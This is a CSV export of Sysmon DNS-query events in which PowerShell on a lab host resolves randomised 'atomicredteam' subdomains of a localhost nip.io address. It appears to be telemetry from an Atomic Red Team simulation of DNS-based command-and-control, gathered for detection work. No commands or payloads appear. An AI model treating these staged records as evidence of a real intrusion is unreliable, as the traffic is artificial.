"2025-12-26 11:26:37.078 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174051,"Query: atomicredteam-972073.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:36.939","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:37.079 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174052,"Query: atomicredteam-708515.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:36.979","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:38.085 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174053,"Query: atomicredteam-38304.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:37.021","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:38.085 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174054,"Query: atomicredteam-693139.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:37.342","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:38.085 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174055,"Query: atomicredteam-735239.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:37.660","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:38.085 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174056,"Query: atomicredteam-99480.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:37.700","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:38.085 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174057,"Query: atomicredteam-254383.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:37.739","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:38.085 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174058,"Query: atomicredteam-81173.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:37.781","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:39.093 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174059,"Query: atomicredteam-577028.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:38.122","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:39.093 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174060,"Query: atomicredteam-668457.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:38.178","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:39.093 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174061,"Query: atomicredteam-401985.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:38.258","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:39.093 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174062,"Query: atomicredteam-356262.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:38.376","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:39.093 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174063,"Query: atomicredteam-396380.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:38.420","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:39.093 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174064,"Query: atomicredteam-286647.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:38.470","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:39.093 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174065,"Query: atomicredteam-17724.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:38.509","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:39.093 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174066,"Query: atomicredteam-698915.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:38.548","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:39.093 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174067,"Query: atomicredteam-437721.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:38.587","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:39.093 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174068,"Query: atomicredteam-514317.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:38.626","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:39.094 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174069,"Query: atomicredteam-195912.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:38.664","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:39.094 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174070,"Query: atomicredteam-608920.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:38.704","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:39.095 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174071,"Query: atomicredteam-387470.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:38.741","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:39.095 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174072,"Query: atomicredteam-325360.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:38.786","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:39.095 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174073,"Query: atomicredteam-353530.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:38.827","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:40.453 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174074,"Query: atomicredteam-682704.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:38.874","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:40.453 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174075,"Query: atomicredteam-183290.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:38.914","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:40.453 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174076,"Query: atomicredteam-273552.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:38.954","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:40.453 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174077,"Query: atomicredteam-14568.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:39.129","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:40.453 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174078,"Query: atomicredteam-188629.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:39.451","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:40.453 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174079,"Query: atomicredteam-852345.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:39.505","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:40.453 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174080,"Query: atomicredteam-311151.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:39.547","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:40.453 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174081,"Query: atomicredteam-568192.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:39.807","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:40.453 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174082,"Query: atomicredteam-171127.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:39.879","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:40.453 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174083,"Query: atomicredteam-589366.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:39.950","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:41.113 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174084,"Query: atomicredteam-655274.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:40.047","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:41.113 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174085,"Query: atomicredteam-89361.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:40.462","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:41.113 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174086,"Query: atomicredteam-238356.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:40.630","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:41.114 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174087,"Query: atomicredteam-598512.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:40.836","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:41.114 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174088,"Query: atomicredteam-927876.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:40.884","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:41.114 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174089,"Query: atomicredteam-403737.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:41.007","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:41.114 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174090,"Query: atomicredteam-213655.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:41.051","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:41.114 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174091,"Query: atomicredteam-952419.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:41.094","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:42.116 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174092,"Query: atomicredteam-804361.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:41.137","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:42.116 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174093,"Query: atomicredteam-845894.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:41.202","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:42.116 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174094,"Query: atomicredteam-807736.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:41.300","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:42.116 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174095,"Query: atomicredteam-609753.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:41.339","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:42.116 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174096,"Query: atomicredteam-790537.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:41.517","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:42.119 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174097,"Query: atomicredteam-461928.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:41.554","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:42.119 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174098,"Query: atomicredteam-645012.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:41.592","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
